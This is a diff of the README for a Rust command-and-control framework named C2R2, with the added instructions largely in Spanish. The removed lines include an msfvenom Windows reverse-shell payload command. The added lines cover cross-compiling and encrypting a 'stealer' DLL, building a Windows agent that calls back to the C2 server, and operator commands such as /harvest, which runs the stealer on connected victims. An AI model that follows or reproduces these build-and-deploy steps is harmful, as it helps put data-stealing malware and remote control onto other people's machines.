@@ -42,40 +42,78 @@ Command & Control Framework written in Rust
 ## 🔧 Installation & Usage
 
 ### Prerequisites
-- Rust toolchain installed (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
-- Git installed
 
-### Building the Project
+#### En Linux/WSL/Kali
 ```bash
-# Clone the repository
-git clone <repository-url>
-cd C2R2
+# Rust toolchain
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
 
-# Build in release mode
-cargo build -p c2r2-server --release
-cargo build --release -p builder
-❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f raw -o rev.bin
-❯ ./builder --encrypt rev.bin
-./builder ../../rev.bin --name agent_test --server 192.168.110.129:4444
-# The binaries will be located in target/release/
+# MinGW-w64 para cross-compilation a Windows
+sudo apt install mingw-w64
+
+# Target de Windows para Rust
+rustup target add x86_64-pc-windows-gnu
 ```
 
-### Running the Listener
-```bash
-# Run the C2 listener
-./target/release/listener
+### Building the Project
 
-# Or with custom port
-./target/release/listener --port 4444
+#### 1. Compilar el módulo Stealer (Windows DLL desde Linux)
+
+```bash
+# Opción A: Script automatizado
+./build-stealer.sh
+
+# Opción B: Manual
+cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
+# Genera: target/x86_64-pc-windows-gnu/release/stealer.dll
+```
+
+#### 2. Encriptar el módulo Stealer
+
+```bash
+cd builder
+cargo run --release -- encrypt-module
+# Genera: c2r2-server/modules/stealer.enc y stealer.key
+```
+
+#### 3. Compilar el servidor C2
+
+```bash
+cd c2r2-server
+cargo build --release
+# Genera: target/release/c2r2-server (Linux/WSL)
+```
+
+#### 4. Generar el agente (lightweight)
+
+```bash
+cd builder
+cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444
+# Genera: output/agent1.exe (~500 KB)
+```
+
+**Ver más detalles en [builder/README.md](builder/README.md)**
+
+### Running the C2 Server
+
+```bash
+cd c2r2-server
+./target/release/c2r2-server
+
+# El servidor escucha en 0.0.0.0:4444 por defecto
 ```
 
 ### Deploying the Agent
-```bash
-# Transfer the agent binary to target system
-scp target/release/agent user@target:/tmp/
 
-# Execute on target (example)
-./agent --server <listener-ip>:4444
+```bash
+# Transferir el agente a la máquina objetivo (Windows)
+# El agente se conecta automáticamente al servidor configurado
+
+# Desde el servidor C2, usar comandos:
+/clients              # Ver agentes conectados
+/select <id>          # Seleccionar un agente
+/upload <file>        # Subir archivo al agente
+/harvest              # Ejecutar stealer (requiere módulo encriptado)
 ```
 
 ## ToDo
